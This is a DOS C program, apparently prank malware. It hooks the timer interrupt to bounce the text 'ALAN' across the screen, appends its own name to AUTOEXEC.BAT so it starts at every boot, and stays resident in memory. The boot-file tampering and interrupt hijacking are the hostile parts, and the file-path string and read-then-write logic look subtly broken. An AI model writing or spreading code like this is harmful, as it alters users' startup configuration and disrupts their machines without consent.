#include <process.h>
#include<dos.h>
#include<conio.h>
#include<stdio.h>
#include <stdlib.h>
#include <string.h>
void interrupt minha_rotina_de_relogio(void);
void interrupt (*clock_tick) (void);
union REGS regs;
struct aonde
{
  char tela[8];
  int pcol,plin;
} a[10];
int lin=-10,col=-10;
char h='s',v='s',guarda[4];
void pingpong(void)
{
       if(h=='s')
	  lin+=1;
       if(h==' ')
	  lin-=1;
       if(v=='s')
	  col+=1;
       if(v==' ')
	  col-=1;
	if(lin>26)
	   h=' ';
	 if(lin<0)
	   h='s';
	 if(col>76)
	    v=' ';
	 if(col<2)
	    v='s';
}
void main(int argc,char *argv[ ])
{
  FILE *s;
  char ch='a',nome[8];
  int cont=0,conf=0,resp=1;
  disable();
  clock_tick = getvect(28);
  setvect(28,minha_rotina_de_relogio);
  enable();
  if(resp==1){

  if ((s=fopen("\AUTOEXEC.BAT","r+"))==NULL){
   printf("\nArquivo nao encontrado.");
   return; }
   fseek(s, 0, SEEK_SET);
   while (ch != EOF)
   {
      ch = fgetc(s);
      nome[7]=ch;
      nome[0]=nome[1];
      nome[1]=nome[2];
      nome[2]=nome[3];
      nome[3]=nome[4];
      nome[4]=nome[5];
      nome[5]=nome[6];
      nome[6]=nome[7];
      cont++;
      if(cont>1)
	 cont=0;
      nome[7]='\0';
      if(strcmp(nome,"prmpgpg")==0)
	 conf=1;
      printf("%s ",nome);
      nome[7]=ch;

   }
   if(conf==0)
     fprintf(s,"prmpgpg\n");
   fclose(s);
   }
  resp=0;

  #ifdef RESIDENTE
	 keep(0,400);
  #else
	 system("\command");
	 disable();
	 setvect(28,clock_tick);
	 enable();
   #endif
}
void interrupt minha_rotina_de_relogio(void)
{
   int i,j;
   static unsigned int horas,minutos,segundos;
   static unsigned long contador;
   static char hora[]="A\2L\2A\2N\2";
   pingpong();
   gettext(col,lin,col+3,lin,a[9].tela);
   a[9].pcol=col;
   a[9].plin=lin;
   puttext(a[9].pcol,a[9].plin,a[9].pcol+3,a[9].plin,hora);
   for(i=0;i<9;i++)
    for(j=0;j<8;j++){                                                                                                                                                     a[i].tela[j] = a[i+1].tela[j];
     a[i].pcol = a[i+1].pcol;                                                                                                                                              a[i].plin = a[i+1].plin;
     }
   puttext(a[0].pcol,a[0].plin,a[0].pcol+3,a[0].plin,a[0].tela);
   clock_tick();
}